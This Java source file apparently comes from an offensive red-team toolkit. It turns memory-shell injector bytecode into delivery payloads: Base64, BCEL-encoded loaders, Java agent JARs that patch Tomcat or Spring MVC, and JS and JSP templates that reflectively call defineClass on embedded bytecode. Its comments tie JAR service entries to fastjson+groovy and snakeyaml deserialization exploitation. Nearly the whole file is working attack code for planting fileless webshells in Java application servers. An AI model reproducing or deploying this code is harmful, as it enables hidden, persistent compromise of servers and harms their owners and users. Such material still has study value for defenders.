package com.potato.potatotool.content.redTeam.memshell.util;

import com.potato.potatotool.utils.data.StrUtils;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
import com.potato.potatotool.content.redTeam.memshell.injector.SpringMVCAgentTransformer;
import com.potato.potatotool.content.redTeam.memshell.injector.TomcatAgentTransformer;
import me.gv7.woodpecker.bcel.HackBCELs;
import me.gv7.woodpecker.tools.codec.BASE64Encoder;

import java.io.*;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Enumeration;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

/**
 * @author Potato
 * @date 2024/7/29 18:14
 */
public class FormatUtil {

    public static byte[] Base64Format(byte[] bytes) {
        Base64.Encoder base64Encoder = Base64.getEncoder();
        return base64Encoder.encodeToString(bytes).replace("\n", "").replace("\r", "")
                .getBytes(StandardCharsets.UTF_8);
    }

    public static byte[] BcelFormat(MemoryObj memoryObj) throws Exception {
        byte[] bcelClzBytes = BCELoaderGenerator.generateBCELoaderClass(memoryObj);
        return HackBCELs.encode(bcelClzBytes).getBytes(StandardCharsets.UTF_8);
    }

    public static byte[] BigIntegerFormat(byte[] bytes) {
        return new BigInteger(bytes).toString(36).getBytes(StandardCharsets.UTF_8);
    }

    public static byte[] JARAgentFormat(byte[] bytes, MemoryObj memoryObj) throws Exception{
        return JARAgentGenerator.generate(bytes, memoryObj);
    }

    public static byte[] JARFormat(byte[] bytes, MemoryObj memoryObj) throws Exception{
        return JARGenerator.generate(bytes, memoryObj);
    }

    public static byte[] JsFormat(byte[] bytes,  MemoryObj memoryObj){
        String javaScript = "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "    classLoader.loadClass(" + JavassistUtil.toJavaStringLiteral(memoryObj.getInjectorClassName()) + ").newInstance();\n" +
                "}catch (e){\n" +
                "    var clsString = classLoader.loadClass('java.lang.String');\n" +
                "    var bytecodeBase64 = " + JavassistUtil.toJavaStringLiteral(new BASE64Encoder().encode(bytes).replace("\n", "").replace("\r", "")) + ";\n" +
                "    var bytecode;\n" +
                "    try{\n" +
                "        var clsBase64 = classLoader.loadClass(\"java.util.Base64\");\n" +
                "        var clsDecoder = classLoader.loadClass(\"java.util.Base64$Decoder\");\n" +
                "        var decoder = clsBase64.getMethod(\"getDecoder\").invoke(clsBase64);\n" +
                "        bytecode = clsDecoder.getMethod(\"decode\", clsString).invoke(decoder, bytecodeBase64);\n" +
                "    } catch (ee) {\n" +
                "        var datatypeConverterClz = classLoader.loadClass(\"javax.xml.bind.DatatypeConverter\");\n" +
                "        bytecode = datatypeConverterClz.getMethod(\"parseBase64Binary\", clsString).invoke(datatypeConverterClz, bytecodeBase64);\n" +
                "    }\n" +
                "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');\n" +
                "    var clsByteArray = classLoader.loadClass('[B');\n" +
                "    var clsInt = java.lang.Integer.TYPE;\n" +
                "    var defineClass = clsClassLoader.getDeclaredMethod(\"defineClass\", clsByteArray, clsInt, clsInt);\n" +
                "    defineClass.setAccessible(true);\n" +
                "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length);\n" +
                "    clazz.newInstance();\n" +
                "}";
        return javaScript.getBytes(StandardCharsets.UTF_8);
    }

    public static byte[] JspFormat(byte[] bytes, MemoryObj memoryObj) throws Exception{
        String jsp = "<%\n" +
                "    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                "    try{\n" +
                "        classLoader.loadClass(" + JavassistUtil.toJavaStringLiteral(memoryObj.getInjectorClassName()) + ").newInstance();\n" +
                "    }catch (Exception e){\n" +
                "        java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                "        defineClass.setAccessible(true);\n" +
                "        String bytecodeBase64 = " + JavassistUtil.toJavaStringLiteral(new BASE64Encoder().encode(bytes).replace("\n", "").replace("\r", "")) + ";\n" +
                "        byte[] bytecode = null;\n" +
                "        try {\n" +
                "            Class base64Clz = classLoader.loadClass(\"java.util.Base64\");\n" +
                "            Class decoderClz = classLoader.loadClass(\"java.util.Base64$Decoder\");\n" +
                "            Object decoder = base64Clz.getMethod(\"getDecoder\").invoke(base64Clz);\n" +
                "            bytecode = (byte[]) decoderClz.getMethod(\"decode\", String.class).invoke(decoder, bytecodeBase64);\n" +
                "        } catch (ClassNotFoundException ee) {\n" +
                "            Class datatypeConverterClz = classLoader.loadClass(\"javax.xml.bind.DatatypeConverter\");\n" +
                "            bytecode = (byte[]) datatypeConverterClz.getMethod(\"parseBase64Binary\", String.class).invoke(datatypeConverterClz, bytecodeBase64);\n" +
                "        }\n" +
                "        Class clazz = (Class)defineClass.invoke(classLoader,bytecode,0,bytecode.length);\n" +
                "        clazz.newInstance();\n" +
                "    }\n" +
                "%>";
        return jsp.getBytes(StandardCharsets.UTF_8);
    }
}

class JARAgentGenerator {
    public static byte[] generate(byte[] bytes, MemoryObj memoryObj) throws Exception {
        String className;
        String simpleName;

        switch (memoryObj.getServerType()) {
            case MemoryShellConstants.SERVER_TOMCAT:
                className = TomcatAgentTransformer.class.getName();
                simpleName = TomcatAgentTransformer.class.getSimpleName();
                break;
            case MemoryShellConstants.SERVER_SPRING_MVC:
                className = SpringMVCAgentTransformer.class.getName();
                simpleName = SpringMVCAgentTransformer.class.getSimpleName();
                break;
            default:
                throw new IllegalArgumentException("Unsupported server type: " + memoryObj.getServerType());
        }

        String classFileName = simpleName.replace('.', '/') + ".class";
        ClassPool pool = ClassPool.getDefault();

        File jarFile = File.createTempFile("agent", ".jar");
        jarFile.deleteOnExit();
        try (InputStream jarStream = JARAgentGenerator.class.getClassLoader().getResourceAsStream("conf/agent.jar");
             FileOutputStream out = new FileOutputStream(jarFile)) {
            if (jarStream == null) {
                throw new FileNotFoundException("Missing resource: conf/agent.jar");
            }
            byte[] buffer = new byte[16 * 1024];
            int bytesRead;
            while ((bytesRead = jarStream.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
        }

        Manifest manifest = createManifest(simpleName);
        File tempJarFile = File.createTempFile("tempJar", ".jar");
        tempJarFile.deleteOnExit();

        try (JarFile jar = new JarFile(jarFile);
             JarOutputStream tempJar = new JarOutputStream(new FileOutputStream(tempJarFile), manifest)) {

            copyJarEntries(jar, tempJar, classFileName);
            addModifiedClassToJar(pool, className, simpleName, classFileName, tempJar,
                    memoryObj.getHeaderName(), memoryObj.getHeaderValue(), StrUtils.base64Encode(bytes));
        }

        return Files.readAllBytes(Paths.get(tempJarFile.getAbsolutePath()));

    }

    private static Manifest createManifest(String agentClassName) {
        Manifest manifest = new Manifest();
        manifest.getMainAttributes().putValue("Manifest-Version", "1.0");
        manifest.getMainAttributes().putValue("Agent-Class", agentClassName);
        manifest.getMainAttributes().putValue("Can-Redefine-Classes", "true");
        manifest.getMainAttributes().putValue("Can-Retransform-Classes", "true");
        manifest.getMainAttributes().putValue("Main-Class", agentClassName);
        return manifest;
    }

    private static void copyJarEntries(JarFile jar, JarOutputStream tempJar, String replacementEntryName) throws IOException {
        Enumeration<JarEntry> jarEntries = jar.entries();
        while (jarEntries.hasMoreElements()) {
            JarEntry entry = jarEntries.nextElement();
            if (JarFile.MANIFEST_NAME.equalsIgnoreCase(entry.getName()) || replacementEntryName.equals(entry.getName())) {
                continue;
            }
            try (InputStream entryInputStream = jar.getInputStream(entry)) {
                tempJar.putNextEntry(entry);
                byte[] buffer = new byte[16 * 1024];
                int bytesRead;
                while ((bytesRead = entryInputStream.read(buffer)) != -1) {
                    tempJar.write(buffer, 0, bytesRead);
                }
                tempJar.closeEntry();
            }
        }
    }

    private static void addModifiedClassToJar(ClassPool pool, String className, String simpleName, String classFileName, JarOutputStream tempJar, String injectHeaderName, String injectHeaderValue, String injectorCode) throws Exception {
        CtClass ctClass = pool.get(className);
        try {
            ctClass.getClassFile().setVersionToJava5();
            ctClass.setName(ClassNameUtil.requireValidJavaClassName(simpleName, "agent transformer class name"));
            JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "injectHeaderName", RandomHeaderUtil.requireValidHeaderName(injectHeaderName));
            JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "injectHeaderValue", RandomHeaderUtil.requireValidHeaderValue(injectHeaderValue));
            JavassistUtil.addOrUpdateMethod(ctClass, "getInjectorCode", JavassistUtil.returnStringBody(injectorCode));
            tempJar.putNextEntry(new JarEntry(classFileName));
            tempJar.write(ctClass.toBytecode());
            tempJar.closeEntry();
        } finally {
            ctClass.detach();
        }
    }
}

class JARGenerator {
    public static byte[] generate(byte[] bytes, MemoryObj memoryObj) throws Exception {
        String className = ClassNameUtil.requireValidJavaClassName(memoryObj.getInjectorClassName(), "injector class name");
        String jarEntryFileName = className.replace(".", "/") + ".class";

        Manifest manifest = new Manifest();
        manifest.getMainAttributes().putValue("Manifest-Version", "1.0");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        try (JarOutputStream jarOutputStream = new JarOutputStream(byteArrayOutputStream, manifest)) {
            // 添加类字节码到JAR文件中
            jarOutputStream.putNextEntry(new JarEntry(jarEntryFileName));
            jarOutputStream.write(bytes);
            jarOutputStream.closeEntry();

            // 如果配置需要实现ASTTransformation接口，则添加相应的服务文件
            // fastjson + groovy 利用
            if (memoryObj.isImplementsASTTransformationType()) {
                addServiceEntry(jarOutputStream, "META-INF/services/org.codehaus.groovy.transform.ASTTransformation", className);
            }

            // 如果配置需要实现ScriptEngineFactory接口，则添加相应的服务文件
            // snakeyaml + loadJar 利用
            if (memoryObj.isImplementsScriptEngineFactory()) {
                addServiceEntry(jarOutputStream, "META-INF/services/javax.script.ScriptEngineFactory", className);
            }
        }

        return byteArrayOutputStream.toByteArray();
    }

    private static void addServiceEntry(JarOutputStream jarOutputStream, String entryName, String className) throws IOException {
        JarEntry entry = new JarEntry(entryName);
        jarOutputStream.putNextEntry(entry);
        jarOutputStream.write(className.getBytes(StandardCharsets.UTF_8));
        jarOutputStream.closeEntry();
    }
}

class BCELoader {

    static {
        new BCELoader();
    }

    private String getClassName() {
        return "";
    }

    private String getBase64String() {
        return "";
    }

    public BCELoader() {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            // 尝试直接加载类
            classLoader.loadClass(getClassName()).newInstance();
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException e) {
            // 如果直接加载失败，尝试通过字节码加载类
            try {
                Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClassMethod.setAccessible(true);
                byte[] classBytes = decodeBase64(getBase64String());
                Class<?> clazz = (Class<?>) defineClassMethod.invoke(classLoader, classBytes, 0, classBytes.length);
                clazz.newInstance();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static byte[] decodeBase64(String input) {
        byte[] decodedBytes = null;
        try {
            // 尝试使用 java.util.Base64 进行解码
            Class<?> base64Class = Class.forName("java.util.Base64");
            Object decoder = base64Class.getMethod("getDecoder").invoke(null);
            decodedBytes = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, input);
        } catch (Exception e) {
            try {
                // 如果 java.util.Base64 解码失败，尝试使用 sun.misc.BASE64Decoder 进行解码
                Class<?> base64DecoderClass = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64DecoderClass.newInstance();
                decodedBytes = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, input);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return decodedBytes;
    }
}

class BCELoaderGenerator {
    public static byte[] generateBCELoaderClass(MemoryObj memoryObj) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        ClassClassPath classPath = new ClassClassPath(BCELoader.class);
        pool.insertClassPath(classPath);
        CtClass ctClass = pool.getCtClass(BCELoader.class.getName());
        try {
            ctClass.setName(ClassNameUtil.requireValidJavaClassName(memoryObj.getLoaderClassName(), "loader class name"));
            ctClass.getClassFile().setVersionToJava5();
            CtMethod getClassNameMethod = ctClass.getDeclaredMethod("getClassName");
            getClassNameMethod.setBody(JavassistUtil.returnStringBody(memoryObj.getInjectorClassName()));
            CtMethod getBase64StringMethod = ctClass.getDeclaredMethod("getBase64String");
            String base64ClassString = encodeToBase64(memoryObj.getInjectorBytes()).replace(System.lineSeparator(), "");
            String[] parts = splitChunks(base64ClassString, 40000);
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < parts.length; i++) {
                if (i > 0) result.append("+");
                result.append("new String(").append(JavassistUtil.toJavaStringLiteral(parts[i])).append(")");
            }
            getBase64StringMethod.setBody(String.format("{return %s;}", result));
            ctClass.defrost();
            JavassistUtil.removeSourceFileAttribute(ctClass);
            return ctClass.toBytecode();
        } finally {
            ctClass.detach();
        }
    }

    private static String encodeToBase64(byte[] input) throws Exception {
        String value = null;
        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, input);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, input);
            } catch (Exception var5) {
            }
        }
        if (value == null) {
            throw new IllegalStateException("Unable to Base64 encode injector bytes");
        }
        return value;
    }

    private static String[] splitChunks(String source, int CHUNK_SIZE) {
        String[] ret = new String[(int) Math.ceil(source.length() / (double) CHUNK_SIZE)];
        char[] payload = source.toCharArray();
        int start = 0;
        for (int i = 0; i < ret.length; i++) {
            if (start + CHUNK_SIZE > payload.length) {
                char[] b = new char[payload.length - start];
                System.arraycopy(payload, start, b, 0, payload.length - start);
                ret[i] = new String(b);
            } else {
                char[] b = new char[CHUNK_SIZE];
                System.arraycopy(payload, start, b, 0, CHUNK_SIZE);
                ret[i] = new String(b);
            }
            start += CHUNK_SIZE;
        }
        return ret;
    }
}
